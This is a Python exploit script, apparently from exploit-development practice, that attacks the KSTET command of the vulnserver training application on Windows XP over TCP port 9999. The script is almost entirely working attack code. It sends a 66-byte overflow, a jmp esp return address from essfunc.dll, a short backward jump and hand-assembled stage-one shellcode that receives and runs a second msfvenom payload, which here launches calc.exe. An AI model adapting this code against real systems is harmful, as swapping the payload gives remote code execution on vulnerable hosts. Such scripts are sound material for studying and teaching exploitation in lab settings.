#!/usr/bin/python3

'''Tested on Windows XP SP3'''

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from time import sleep
from sys import exit

# CONSTANTS
rhost = "192.168.1.29"
rport = 9999
target = (rhost, rport)
timeout_val = 10  # seconds

# Payload: msfvenom -a x86 --platform windows -p windows/exec CMD="calc.exe" -f python -b "\x00" EXITFUNC=thread
buf =  b""
buf += b"\xd9\xc6\xd9\x74\x24\xf4\x5d\x33\xc9\xb8\x88\xca\x5e"
buf += b"\x55\xb1\x31\x31\x45\x18\x83\xed\xfc\x03\x45\x9c\x28"
buf += b"\xab\xa9\x74\x2e\x54\x52\x84\x4f\xdc\xb7\xb5\x4f\xba"
buf += b"\xbc\xe5\x7f\xc8\x91\x09\x0b\x9c\x01\x9a\x79\x09\x25"
buf += b"\x2b\x37\x6f\x08\xac\x64\x53\x0b\x2e\x77\x80\xeb\x0f"
buf += b"\xb8\xd5\xea\x48\xa5\x14\xbe\x01\xa1\x8b\x2f\x26\xff"
buf += b"\x17\xdb\x74\x11\x10\x38\xcc\x10\x31\xef\x47\x4b\x91"
buf += b"\x11\x84\xe7\x98\x09\xc9\xc2\x53\xa1\x39\xb8\x65\x63"
buf += b"\x70\x41\xc9\x4a\xbd\xb0\x13\x8a\x79\x2b\x66\xe2\x7a"
buf += b"\xd6\x71\x31\x01\x0c\xf7\xa2\xa1\xc7\xaf\x0e\x50\x0b"
buf += b"\x29\xc4\x5e\xe0\x3d\x82\x42\xf7\x92\xb8\x7e\x7c\x15"
buf += b"\x6f\xf7\xc6\x32\xab\x5c\x9c\x5b\xea\x38\x73\x63\xec"
buf += b"\xe3\x2c\xc1\x66\x09\x38\x78\x25\x47\xbf\x0e\x53\x25"
buf += b"\xbf\x10\x5c\x19\xa8\x21\xd7\xf6\xaf\xbd\x32\xb3\x50"
buf += b"\x5c\x97\xc9\xf8\xf9\x72\x70\x65\xfa\xa8\xb6\x90\x79"
buf += b"\x59\x46\x67\x61\x28\x43\x23\x25\xc0\x39\x3c\xc0\xe6"
buf += b"\xee\x3d\xc1\x84\x71\xae\x89\x64\x14\x56\x2b\x79"


# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
exploit = (
    b"\x90"
    b"\x54"                     # PUSH ESP
    b"\x59"                     # POP ECX
    b"\x66\x81\xC1\x88\x01"     # ADD CX,188
    b"\x83\xEC\x50"             # SUB ESP, 50
    b"\x33\xD2"                 # XOR EDX,EDX
    b"\x52"                     # PUSH EDX
    b"\x80\xC6\x02"             # ADD DH,2
    b"\x52"                     # PUSH EDX
    b"\x54"                     # PUSH ESP
    b"\x5A"                     # POP EDX
    b"\x83\xC2\x50"             # ADD EDX, 50
    b"\x52"                     # PUSH EDX
    b"\xFF\x31"                 # PUSH DWORD PTR DS:[ECX]
    b"\xB8\x11\x2C\x25\x40"     # MOV EAX, 40252C11
    b"\xC1\xE8\x08"             # SHR EAX, 8
    b"\xFF\xD0"                 # CALL EAX
)
exploit += b"\x90" * (66 - len(exploit))
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll]
# ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
# \\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll
exploit += pack("<L", 0x62501203)
# 00B7FA0C  ^EB B8            JMP SHORT 00B7F9C6
# JMP -72 (decimal) bytes
exploit += b"\xEB\xB8"
exploit += b"\x90" * 18

payload = b"KSTET /.:/"
payload += exploit

if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the target')
        s.connect(target)
        print('[*] sending exploit')
        s.send(payload)
        print('[*] sending out payload value')
        sleep(1)
        s.send(buf)
        print('[*] cleaning up')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, have you tried:')
        print('\t* ensure the debugger is not in a paused state')
        print('\t* checking if the VM is connected to the right virt network?')
        exit(1)
    except error:
        print('[!] a socket error occurred, is the host up?')
        exit(1)
    except KeyboardInterrupt:
        print()  # drop us below the ^C
        print('[!] user initiated cancel, exiting...')
        exit(1)

